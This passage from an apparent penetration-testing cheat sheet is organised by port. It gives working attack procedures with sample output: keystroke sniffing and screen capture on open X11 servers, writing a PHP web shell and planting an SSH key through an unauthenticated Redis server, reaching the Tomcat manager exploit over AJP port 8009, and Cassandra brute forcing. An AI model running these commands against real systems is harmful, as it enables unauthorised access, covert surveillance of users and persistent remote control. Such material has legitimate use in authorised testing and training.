<h4>X11 No-Auth Scanner<a class="headerlink" href="#x11-no-auth-scanner" title="Link to this heading"></a></h4>
<p>Module scans for X11 servers that allow anyone to connect without authentication.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/scanner/x11/open_x11</span>
<span class="go">services -p 6000 -u -R</span>
</pre></div>
</div>
<p>Sample output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.9.xx.xx Access Denied</span>
<span class="go">[*] 10.9.xx.xx Open X Server (The XFree86 Project, Inc)</span>
<span class="go">[*] Scanned  5 of 45 hosts (11% complete)</span>
<span class="go">[-] No response received due to a timeout</span>
<span class="go">[*] 10.10.xx.xx Access Denied</span>
<span class="go">[*] Scanned  9 of 45 hosts (20% complete)</span>
<span class="go">[*] 10.11.xx.xx Access Denied</span>
<span class="go">[*] Scanned 14 of 45 hosts (31% complete)</span>
<span class="go">[*] 10.15.xx.xx Access Denied</span>
<span class="go">[*] Scanned 18 of 45 hosts (40% complete)</span>
<span class="go">[*] 10.19.xx.xx Access Denied</span>
<span class="go">[*] Scanned 23 of 45 hosts (51% complete)</span>
<span class="go">[*] Scanned 27 of 45 hosts (60% complete)</span>
<span class="go">[*] Scanned 32 of 45 hosts (71% complete)</span>
<span class="go">[*] 10.20.xx.xx Open X Server (Xfree86-Heidenhain-Project)</span>
</pre></div>
</div>
</section>
<section id="x11-keyboard-command-injection">
<h4>X11 Keyboard Command Injection<a class="headerlink" href="#x11-keyboard-command-injection" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use exploit/unix/x11/x11_keyboard_exec</span>
</pre></div>
</div>
<p>For more information: Refer: <a class="reference external" href="http://rageweb.info/2014/05/04/open-x11-server/">Open-x11-server</a></p>
</section>
</section>
<section id="id66">
<h3>Other<a class="headerlink" href="#id66" title="Link to this heading"></a></h3>
<section id="xspy">
<h4>xspy<a class="headerlink" href="#xspy" title="Link to this heading"></a></h4>
<p><a class="reference external" href="http://tools.kali.org/sniffingspoofing/xspy">xspy</a> to sniff the keyboard keystrokes.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xspy 10.9.xx.xx</span>

<span class="go">opened 10.9.xx.xx:0 for snoopng</span>
<span class="go">swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123</span>
<span class="go">qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab</span>
</pre></div>
</div>
</section>
<section id="xdpyinfo">
<h4>xdpyinfo<a class="headerlink" href="#xdpyinfo" title="Link to this heading"></a></h4>
<p>We can also use x11 to grab <strong>screenshots or live videos</strong> of the user. We need to  verify the connection is open and we can get to it:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xdpyinfo -display &lt;ip&gt;:&lt;display&gt;</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xdpyinfo -display 10.20.xx.xx:0</span>
<span class="go">name of display:    10.20.xx.xx:0</span>
<span class="go">version number:    11.0</span>
<span class="go">vendor string:    Xfree86-Heidenhain-Project</span>
<span class="go">vendor release number:    0</span>
<span class="go">maximum request size:  262140 bytes</span>
<span class="go">motion buffer size:  0</span>
<span class="go">bitmap unit, bit order, padding:    32, LSBFirst, 32</span>
<span class="go">image byte order:    LSBFirst</span>
<span class="go">number of supported pixmap formats:    6</span>
<span class="go">supported pixmap formats:</span>
<span class="go">    depth 1, bits_per_pixel 1, scanline_pad 32</span>
<span class="go">    depth 4, bits_per_pixel 8, scanline_pad 32</span>
<span class="go">    depth 8, bits_per_pixel 8, scanline_pad 32</span>
<span class="go">    depth 15, bits_per_pixel 16, scanline_pad 32</span>
<span class="go">    depth 16, bits_per_pixel 16, scanline_pad 32</span>
<span class="go">    depth 24, bits_per_pixel 32, scanline_pad 32</span>
<span class="go">keycode range:    minimum 8, maximum 255</span>
<span class="go">focus:  window 0x600005, revert to Parent</span>
<span class="go">number of extensions:    11</span>
<span class="go">   FontCache</span>
<span class="go">    MIT-SCREEN-SAVER</span>
<span class="go">    MIT-SHM</span>
<span class="go">    RECORD</span>
<span class="go">    SECURITY</span>
<span class="go">    SHAPE</span>
<span class="go">    XC-MISC</span>
<span class="go">    XFree86-DGA</span>
<span class="go">    XFree86-VidModeExtension</span>
<span class="go">    XInputExtension</span>
<span class="go">    XVideo</span>
<span class="go">default screen number:    0</span>
<span class="go">number of screens:    1</span>
<span class="go"> screen #0:</span>
<span class="go"> dimensions:    1024x768 pixels (347x260 millimeters)</span>
<span class="go">  resolution:    75x75 dots per inch</span>
<span class="go">  depths (6):    16, 1, 4, 8, 15, 24</span>
<span class="go">  root window id:    0x25</span>
<span class="go">  depth of root window:    16 planes</span>
<span class="go">  number of colormaps:    minimum 1, maximum 1</span>
<span class="go">  default colormap:    0x20</span>
<span class="go">  default number of colormap cells:    64</span>
<span class="go">  preallocated pixels:    black 0, white 65535</span>
<span class="go">  options:    backing-store NO, save-unders NO</span>
<span class="go">  largest cursor:    32x32</span>
<span class="go">  current input event mask:    0x0</span>
<span class="go">  number of visuals:    2</span>
<span class="go">  default visual id:  0x21</span>
<span class="go">  visual:</span>
<span class="go">  visual id:    0x21</span>
<span class="go">  class:    TrueColor</span>
<span class="go">  depth:    16 planes</span>
<span class="go">  available colormap entries:    64 per subfield</span>
<span class="go">  red, green, blue masks:    0xf800, 0x7e0, 0x1f</span>
<span class="go">  significant bits in color specification:    6 bits</span>
<span class="go">visual:</span>
<span class="go">  visual id:    0x22</span>
<span class="go">  class:    DirectColor</span>
<span class="go">  depth:    16 planes</span>
<span class="go">  available colormap entries:    64 per subfield</span>
<span class="go">  red, green, blue masks:    0xf800, 0x7e0, 0x1f</span>
<span class="go">  significant bits in color specification:    6 bits</span>
</pre></div>
</div>
</section>
<section id="xwd">
<h4>xwd<a class="headerlink" href="#xwd" title="Link to this heading"></a></h4>
<p>To take the <strong>screenshot</strong> use:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xwd -root -display 10.20.xx.xx:0 -out xdump.xdump</span>
<span class="go">display xdump.xdump</span>
</pre></div>
</div>
</section>
<section id="xwininfo">
<h4>xwininfo<a class="headerlink" href="#xwininfo" title="Link to this heading"></a></h4>
<p><strong>live viewing</strong>:</p>
<p>First we need to find the ID of the window using xwininfo</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xwininfo -root -display 10.9.xx.xx:0</span>

<span class="go">xwininfo: Window id: 0x45 (the root window) (has no name)</span>

<span class="go">Absolute upper-left X:  0</span>
<span class="go">Absolute upper-left Y:  0</span>
<span class="go">Relative upper-left X:  0</span>
<span class="go">Relative upper-left Y:  0</span>
<span class="go">Width: 1024</span>
<span class="go">Height: 768</span>
<span class="go">Depth: 16</span>
<span class="go">Visual: 0x21</span>
<span class="go">Visual Class: TrueColor</span>
<span class="go">Border width: 0</span>
<span class="go">Class: InputOutput</span>
<span class="go">Colormap: 0x20 (installed)</span>
<span class="go">Bit Gravity State: ForgetGravity</span>
<span class="go">Window Gravity State: NorthWestGravity</span>
<span class="go">Backing Store State: NotUseful</span>
<span class="go">Save Under State: no</span>
<span class="go">Map State: IsViewable</span>
<span class="go">Override Redirect State: no</span>
<span class="go">Corners:  +0+0  -0+0  -0-0  +0-0</span>
<span class="go">-geometry 1024x768+0+0</span>
</pre></div>
</div>
</section>
<section id="xwatchwin">
<h4>XWatchwin<a class="headerlink" href="#xwatchwin" title="Link to this heading"></a></h4>
<p>For <strong>live viewing</strong> we need to use</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo</span>
<span class="go">./xwatchwin 10.9.xx.xx:0 -w 0x45</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-6379-redis">
<span id="redis-port-6379"></span><h2>Port 6379 - Redis<a class="headerlink" href="#port-6379-redis" title="Link to this heading"></a></h2>
<section id="id68">
<h3>Nmap<a class="headerlink" href="#id68" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>redis info script</p></li>
</ul>
</section>
<section id="id69">
<h3>Metasploit<a class="headerlink" href="#id69" title="Link to this heading"></a></h3>
<blockquote>
<div><p>has three modules on redis:</p>
</div></blockquote>
<ul class="simple">
<li><p>login</p></li>
<li><p>info and</p></li>
<li><p>file upload</p></li>
</ul>
</section>
<section id="id70">
<h3>Other<a class="headerlink" href="#id70" title="Link to this heading"></a></h3>
<p>The below is taken from <a class="reference external" href="https://github.com/tfairane/Redis.turb">tfairane redis</a> where he has presented a write up for a Vulnhub machine</p>
<ul class="simple">
<li><p>First, the web server on the server broadcasts, including a simple PHP code and create a back door, which will help us to execute commands on the server. Or it will enable us to take direct shell weevely, webacoo to upload the files we create with tools like.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">CONFIG SET dir /var/www/html/</span>
<span class="go">CONFIG SET dbfilename shell.php</span>
<span class="go">CONFIG GET dbfilename</span>
<span class="go">1) &quot;dbfilename&quot;</span>
<span class="go">2) &quot;bomba.php&quot;</span>

<span class="go">SET cmd &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span>
<span class="go">OK</span>
<span class="go">BGSAVE</span>
</pre></div>
</div>
<p>which can be accessed using</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://IP/shell.php?cmd=whoami</span>
<span class="go">www-data</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Second, file type found in the users home directory because it is our right and remote SSH access with a key instead of using the password used to connect to create key, they may be directly unencrypted user rights that provide access to the system.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">1:  ssh-keygen -t rsa</span>
<span class="go">2:</span>
<span class="go">3:  (echo -e &quot;\n&quot;; cat id_rsa.pub; echo -e &quot;\n&quot;) &gt; auth_key</span>
<span class="go">4:</span>
<span class="go">5:  cat auth_key | redis-cli -h hostname -x set crackit</span>
<span class="go">6:  redis-cli -h hostname</span>
<span class="go">7:</span>
<span class="go">8:  config set dir /root/.ssh/</span>
<span class="go">9:  config get dir</span>
<span class="go">10:  config set dbfilename &quot;authorized_keys&quot;</span>
<span class="go">11:  save</span>
<span class="go">12:</span>
<span class="go">13:  config set dir /home/user/.ssh/</span>
<span class="go">14:  save</span>
<span class="go">15:</span>
<span class="go">16:  config set dir /home/admin/.ssh/</span>
<span class="go">17:</span>
<span class="go">18:  ssh user@kevgir -p 1322 -i id_rsa</span>
</pre></div>
</div>
<ul class="simple">
<li><p>1 - He has given parameters in line with a 2048-bit RSA key pair is generated. We can give it a password when we log in.</p></li>
<li><p>3 -  The public key of his own and to receive the new line last line auth_key name we are writing a new file. We will upload this file to the target machine via the Redis server.</p></li>
<li><p>5 and 6. data from the key input in the standard line that we say we do, and then take the memory contents auth_key entry Redis server.</p></li>
<li><p>8, 9, 10, 11 in which the location of the file content to be installed in the line number, which is stated to be added to the bottom of the file. SAVE transactions made by the commands are processed on the server side to make it happen.</p></li>
<li><p>13 and 16 lines in the root of the same process that we have done for other users in order to gain access with the privileges they also inside the ssh folder in the main folder authorized_keys are doing the same procedure for writing to file.</p></li>
</ul>
</div></blockquote>
</section>
</section>
<section id="port-8009-ajp-apache-jserv-protocol">
<span id="ajp-apache-jserv-protocol-port-8009"></span><h2>Port 8009 - AJP (Apache JServ Protocol)<a class="headerlink" href="#port-8009-ajp-apache-jserv-protocol" title="Link to this heading"></a></h2>
<p>The Tomcat manager interface is usually accessed on the Tomcat HTTP(S) port. but we often do forget that we can also access that manager interface on port 8009 that by default handles the AJP (Apache JServ Protocol) protocol.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>AJP is a wire protocol. Its an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible, but proxy the request to Tomcat for Tomcat related contents.</p>
</div>
<p>Sometimes we do encounter situation where port:8009 is open and the rest port 8080,8180,8443 or 80 are closed. in these kind of scenario we can use metasploit framework to exploit the services running. Here, we can configure Apache to proxy the requests to Tomcat port 8009. details for doing so is given in the reference. Below is an overview of the commands (apache must already be installed) as mentioned in <a class="reference external" href="https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/">8009 The Forgotten Tomcat Port</a>.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo apt-get install libapach2-mod-jk</span>
<span class="go">sudo vim /etc/apache2/mods-available/jk.conf</span>
<span class="gp">     # </span>Where<span class="w"> </span>to<span class="w"> </span>find<span class="w"> </span>workers.properties
<span class="gp">     # </span>Update<span class="w"> </span>this<span class="w"> </span>path<span class="w"> </span>to<span class="w"> </span>match<span class="w"> </span>your<span class="w"> </span>conf<span class="w"> </span>directory<span class="w"> </span>location
<span class="go">     JkWorkersFile /etc/apache2/jk_workers.properties</span>
<span class="gp">     # </span>Where<span class="w"> </span>to<span class="w"> </span>put<span class="w"> </span>jk<span class="w"> </span>logs
<span class="gp">     # </span>Update<span class="w"> </span>this<span class="w"> </span>path<span class="w"> </span>to<span class="w"> </span>match<span class="w"> </span>your<span class="w"> </span>logs<span class="w"> </span>directory<span class="w"> </span>location
<span class="go">     JkLogFile /var/log/apache2/mod_jk.log</span>
<span class="gp">     # </span>Set<span class="w"> </span>the<span class="w"> </span>jk<span class="w"> </span>log<span class="w"> </span>level<span class="w"> </span><span class="o">[</span>debug/error/info<span class="o">]</span>
<span class="go">     JkLogLevel info</span>
<span class="gp">     # </span>Select<span class="w"> </span>the<span class="w"> </span>log<span class="w"> </span>format
<span class="go">     JkLogStampFormat &quot;[%a %b %d %H:%M:%S %Y]&quot;</span>
<span class="gp">     # </span>JkOptions<span class="w"> </span>indicate<span class="w"> </span>to<span class="w"> </span>send<span class="w"> </span>SSL<span class="w"> </span>KEY<span class="w"> </span>SIZE,
<span class="go">     JkOptions +ForwardKeySize +ForwardURICompat -ForwardDirectories</span>
<span class="gp">     # </span>JkRequestLogFormat<span class="w"> </span><span class="nb">set</span><span class="w"> </span>the<span class="w"> </span>request<span class="w"> </span>format
<span class="go">     JkRequestLogFormat &quot;%w %V %T&quot;</span>
<span class="gp">     # </span>Shm<span class="w"> </span>log<span class="w"> </span>file
<span class="go">     JkShmFile /var/log/apache2/jk-runtime-status</span>
<span class="go">sudo ln -s /etc/apache2/mods-available/jk.conf /etc/apache2/mods-enabled/jk.conf</span>
<span class="go">sudo vim /etc/apache2/jk_workers.properties</span>
<span class="gp">     # </span>Define<span class="w"> </span><span class="m">1</span><span class="w"> </span>real<span class="w"> </span>worker<span class="w"> </span>named<span class="w"> </span>ajp13
<span class="go">     worker.list=ajp13</span>
<span class="gp">     # </span>Set<span class="w"> </span>properties<span class="w"> </span><span class="k">for</span><span class="w"> </span>worker<span class="w"> </span>named<span class="w"> </span>ajp13<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span>ajp13<span class="w"> </span>protocol,
<span class="gp">     # </span>and<span class="w"> </span>run<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">8009</span>
<span class="go">     worker.ajp13.type=ajp13</span>
<span class="go">     worker.ajp13.host=localhost</span>
<span class="go">     worker.ajp13.port=8009</span>
<span class="go">     worker.ajp13.lbfactor=50</span>
<span class="go">     worker.ajp13.cachesize=10</span>
<span class="go">     worker.ajp13.cache_timeout=600</span>
<span class="go">     worker.ajp13.socket_keepalive=1</span>
<span class="go">     worker.ajp13.socket_timeout=300</span>
<span class="go">sudo vim /etc/apache2/sites-enabled/000-default</span>
<span class="go"> JkMount /* ajp13</span>
<span class="go"> JkMount /manager/   ajp13</span>
<span class="go"> JkMount /manager/*  ajp13</span>
<span class="go"> JkMount /host-manager/   ajp13</span>
<span class="go"> JkMount /host-manager/*  ajp13</span>
<span class="go">sudo a2enmod proxy_ajp</span>
<span class="go">sudo a2enmod proxy_http</span>
<span class="go">sudo /etc/init.d/apache2 restart</span>
</pre></div>
</div>
<p>here we have to set the worker.ajp13.host to the correct host and we can just point out the metapsloit tomcat exploit to localhost:80 and compromise.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf  exploit(tomcat_mgr_deploy) &gt; show options</span>

<span class="go">Module options (exploit/multi/http/tomcat_mgr_deploy):</span>

<span class="go">Name      Current Setting  Required  Description</span>
<span class="go">----      ---------------  --------  -----------</span>
<span class="go">PASSWORD  tomcat           no        The password for the specified username</span>
<span class="go">PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)</span>
<span class="go">Proxies                    no        Use a proxy chain</span>
<span class="go">RHOST     localhost        yes       The target address</span>
<span class="go">RPORT     80               yes       The target port</span>
<span class="go">USERNAME  tomcat           no        The username to authenticate as</span>
<span class="go">VHOST                      no        HTTP server virtual host</span>
</pre></div>
</div>
<ul class="simple">
<li><p>References:</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference external" href="http://wiki.apache.org/tomcat/FAQ/Connectors">Connectors</a></p></li>
<li><p><a class="reference external" href="http://tomcat.apache.org/connectors-doc-archive/jk2/common/AJPv13.html">AJPv13</a></p></li>
<li><p><a class="reference external" href="http://blog.rajeevsharma.in/2010/02/configure-modjk-with-apache-22-in.html">Configure modjk with apache</a></p></li>
</ul>
</div></blockquote>
</section>
<section id="port-9100-pjl">
<span id="pjl-port-9100"></span><h2>Port 9100 - PJL<a class="headerlink" href="#port-9100-pjl" title="Link to this heading"></a></h2>
<section id="id71">
<h3>Metasploit<a class="headerlink" href="#id71" title="Link to this heading"></a></h3>
<p>There are multiple modules in the metasploit for PJL.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Name                                             Disclosure Date  Rank    Description</span>
<span class="go">----                                             ---------------  ----    -----------</span>
<span class="go">auxiliary/scanner/printer/printer_delete_file                     normal  Printer File Deletion Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_download_file                   normal  Printer File Download Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_env_vars                        normal  Printer Environment Variables Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_list_dir                        normal  Printer Directory Listing Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_list_volumes                    normal  Printer Volume Listing Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_ready_message                   normal  Printer Ready Message Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_upload_file                     normal  Printer File Upload Scanner</span>
<span class="go">auxiliary/scanner/printer/printer_version_info                    normal  Printer Version Information Scanner</span>
<span class="go">auxiliary/server/capture/printjob_capture                         normal  Printjob Capture Service</span>
</pre></div>
</div>
<p>As of now, We only got a chance to use</p>
<section id="printer-version-information-scanner">
<h4>Printer Version Information Scanner<a class="headerlink" href="#printer-version-information-scanner" title="Link to this heading"></a></h4>
<p>Scans for printer version information using the Printer Job Language (PJL) protocol.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/printer/printer_version_info</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:9100 - HP LaserJet M1522nf MFP</span>
<span class="go">[*] Scanned 1 of 1 hosts (100% complete)</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
</section>
<section id="id72">
<h3>Nmap<a class="headerlink" href="#id72" title="Link to this heading"></a></h3>
<section id="pjl-ready-message">
<h4>PJL-ready-message<a class="headerlink" href="#pjl-ready-message" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/pjl-ready-message.html">PJL-ready-message</a> : It retrieves or sets the ready message on printers that support the Printer Job Language. This includes most PostScript printers that listen on port 9100. Without an argument, displays the current ready message. With the pjl_ready_message script argument, displays the old ready message and changes it to the message given.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script=pjl-ready-message.nse -n -p 9100 10.10.xx.xx</span>

<span class="go">Nmap scan report for 10.10.xx.xx</span>
<span class="go">Host is up (0.14s latency).</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">9100/tcp open  jetdirect</span>
<span class="go">|_pjl-ready-message: &quot;Processing...&quot;</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-9160-apache-cassandra">
<span id="apache-cassandra-port-9160"></span><h2>Port 9160 - Apache Cassandra<a class="headerlink" href="#port-9160-apache-cassandra" title="Link to this heading"></a></h2>
<p>For Apache Cassandra,</p>
<section id="id74">
<h3>NMap<a class="headerlink" href="#id74" title="Link to this heading"></a></h3>
<section id="cassandra-info">
<h4>Cassandra-info<a class="headerlink" href="#cassandra-info" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/cassandra-info.html">cassandra-info.nse</a> which attempts to get basic info and server status from a Cassandra database.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 9160 10.10.xx.xx -n --script=cassandra-info</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-27 21:14 IST</span>
<span class="go">Nmap scan report for 10.10.xx.xx</span>
<span class="go">Host is up (0.16s latency).</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">9160/tcp open  cassandra</span>
<span class="go">| cassandra-info:</span>
<span class="go">|   Cluster name: Convoy</span>
<span class="go">|_  Version: 19.20.0</span>
</pre></div>
</div>
</section>
<section id="cassandra-brute">
<h4>Cassandra-brute<a class="headerlink" href="#cassandra-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/cassandra-brute.html">cassandra-brute</a> which performs brute force password auditing against the Cassandra database.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 9160 122.166.xx.xx -n --script=cassandra-brute</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-27 21:19 IST</span>
<span class="go">Nmap scan report for 122.166.xx.xx</span>
<span class="go">Host is up (0.083s latency).</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">9160/tcp open  apani1</span>
<span class="go">|_cassandra-brute: Any username and password would do, &#39;default&#39; was used to test</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-10000-ndmp-network-data-management-protocol">
<span id="network-data-management-protocol-port-10000"></span><h2>Port 10000 - ndmp (Network Data Management Protocol)<a class="headerlink" href="#port-10000-ndmp-network-data-management-protocol" title="Link to this heading"></a></h2>
<section id="id76">
<h3>Nmap<a class="headerlink" href="#id76" title="Link to this heading"></a></h3>
<section id="ndmp-fs-info">
<h4>ndmp-fs-info<a class="headerlink" href="#ndmp-fs-info" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ndmp-fs-info.html">ndmp-fs-info.nse</a> can be used to list remote file systems</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">services -s ndmp -p 10000</span>
<span class="go">services -p 10000 -s ndmp -o /tmp/ndmp.ports</span>
<span class="go">cat /tmp/ndmp.ports | cut -d , -f1 | tr -d \&quot; | grep -v host &gt; /tmp/ndmp.ports.2</span>
</pre></div>
</div>
<p>Pass this to nmap</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 10000 --script ndmp-fs-info -n -iL /tmp/ndmp.ports.2</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">| ndmp-fs-info:</span>
<span class="go">| FS       Logical device             Physical device</span>
<span class="go">| NTFS     C:                         Device0000</span>
<span class="go">| NTFS     D:                         Device0000</span>
<span class="go">| NTFS     E:                         Device0000</span>
<span class="go">| RMAN     Oracle-Win::\\TRDPLM\WIND  Device0000</span>
<span class="go">| UNKNOWN  Shadow Copy Components     Device0000</span>
<span class="go">|_UNKNOWN  System State               Device0000</span>
</pre></div>
</div>
</section>
<section id="ndmp-version">
<h4>ndmp-version<a class="headerlink" href="#ndmp-version" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ndmp-version.html">ndmp-version</a> : Retrieves version information from the remote Network Data Management Protocol (ndmp) service. NDMP is a protocol intended to transport data between a NAS device and the backup device, removing the need for the data to pass through the backup server. This nse although is not outputing the version correctly, however if we switch to –script-trace we do find the versions</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00</span>
<span class="go">00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft</span>
<span class="go">00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.</span>
<span class="go">00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for</span>
<span class="go">00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3</span>
<span class="go">00000060: 00 00 00 be 00 00 00 05 00 00 00 04</span>

<span class="go">NSOCK INFO [5.0650s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 1122 [10.10.xx.xx:10000] (108 bytes)</span>
<span class="go">NSE: TCP 10.10.xx.xx:40435 &lt; 10.10.9.12:10000 | 00000000: 80 00 00 68 00 00 00 03 56 f1 64 e7 00 00 00 01    h    V d</span>
<span class="go">00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00</span>
<span class="go">00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft</span>
<span class="go">00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.</span>
<span class="go">00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for</span>
<span class="go">00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-11211-memcache">
<span id="memcache-port-11211"></span><h2>Port 11211 - Memcache<a class="headerlink" href="#port-11211-memcache" title="Link to this heading"></a></h2>
<p>Memcached is a free &amp; open source, high-performance, distributed memory object caching system.</p>
<section id="id78">
<h3>Nmap<a class="headerlink" href="#id78" title="Link to this heading"></a></h3>
<section id="memcached-info">
<h4>memcached-info<a class="headerlink" href="#memcached-info" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/memcached-info.html">memcached-info</a> : Retrieves information (including system architecture, process ID, and server time) from distributed memory object caching system memcached.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 11211 --script memcached-info 10.10.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-27 02:48 IST</span>
<span class="go">Nmap scan report for email.xxxxxx.com (10.10.xx.xx)</span>
<span class="go">Host is up (0.082s latency).</span>
<span class="go">PORT      STATE SERVICE</span>
<span class="go">11211/tcp open  unknown</span>
<span class="go">| memcached-info:</span>
<span class="go">|   Process ID           4252</span>
<span class="go">|   Uptime               1582276 seconds</span>
<span class="go">|   Server time          2016-03-26T21:18:15</span>
<span class="go">|   Architecture         64 bit</span>
<span class="go">|   Used CPU (user)      25.881617</span>
<span class="go">|   Used CPU (system)    17.413088</span>
<span class="go">|   Current connections  14</span>
<span class="go">|   Total connections    41</span>
<span class="go">|   Maximum connections  1024</span>
<span class="go">|   TCP Port             11211</span>
<span class="go">|   UDP Port             11211</span>
<span class="go">|_  Authentication       no</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds</span>
</pre></div>
</div>
</section>
<section id="id80">
<h4>Other<a class="headerlink" href="#id80" title="Link to this heading"></a></h4>
<p>We can also telnet to this port: Stats is one of the commands</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">telnet 10.10.xx.xx 11211</span>
<span class="go">stats</span>
<span class="go">STAT pid 4252</span>
<span class="go">STAT uptime 1582386</span>
<span class="go">STAT time 1459027205</span>
<span class="go">STAT version 1.4.10</span>
<span class="go">STAT libevent 2.0.16-stable</span>
<span class="go">STAT pointer_size 64</span>
<span class="go">STAT rusage_user 25.889618</span>
<span class="go">STAT rusage_system 17.417088</span>
<span class="go">STAT curr_connections 14</span>
<span class="go">STAT total_connections 42</span>
<span class="go">STAT connection_structures 15</span>
<span class="go">STAT reserved_fds 20</span>
<span class="go">STAT cmd_get 3</span>
<span class="go">STAT cmd_set 3</span>
<span class="go">STAT cmd_flush 0</span>
<span class="go">STAT cmd_touch 0</span>
<span class="go">STAT get_hits 2</span>
<span class="go">STAT get_misses 1</span>
<span class="go">STAT delete_misses 0</span>
<span class="go">STAT delete_hits 0</span>
<span class="go">STAT incr_misses 0</span>
<span class="go">STAT incr_hits 0</span>
<span class="go">STAT decr_misses 0</span>
<span class="go">STAT decr_hits 0</span>
<span class="go">STAT cas_misses 0</span>
<span class="go">STAT cas_hits 0</span>
<span class="go">STAT cas_badval 0</span>
<span class="go">STAT touch_hits 0</span>
<span class="go">STAT touch_misses 0</span>
<span class="go">STAT auth_cmds 0</span>
<span class="go">STAT auth_errors 0</span>
<span class="go">STAT bytes_read 775</span>
<span class="go">STAT bytes_written 26158</span>
